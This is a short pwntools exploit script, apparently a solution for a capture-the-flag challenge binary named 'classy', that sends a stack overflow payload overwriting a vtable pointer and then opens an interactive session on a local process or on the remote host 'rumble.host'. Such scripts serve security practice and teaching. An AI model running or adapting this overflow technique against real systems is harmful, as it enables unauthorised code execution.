#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./classy")


def start(argv=[], *a, **kw):
    host = args.HOST or 'rumble.host'
    port = int(args.PORT or 9797)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

highlevel_vtable = 0x406a98

pad = 0x100 + 0x8

payload = b"A" * pad + p64(highlevel_vtable)

io.sendlineafter(b"level?\n", b"1")
io.sendlineafter(b"level.\n", b"3")
io.sendlineafter(b"me?\n", payload)

io.interactive()
